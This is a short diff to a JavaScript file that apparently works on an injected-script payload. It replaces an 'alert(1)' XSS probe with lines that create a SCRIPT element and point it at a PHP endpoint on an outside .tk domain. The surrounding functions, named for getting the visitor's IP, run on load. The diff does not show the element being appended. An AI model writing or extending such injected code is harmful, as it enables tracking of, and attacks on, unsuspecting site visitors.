@@ -1,6 +1,8 @@
+var xcreateElement = document.createElement('SCRIPT');
+var xcreateElement_url='https://dcap9.tk/myxxxxpkc/xmlHttpRequestUrl.php'
 function NewMyGetIPCall()
 {
-	alert(1)
+
 
 }
 
@@ -34,4 +36,3 @@ function NewMyGetIP()
 
 }
 NewMyGetIP()
-
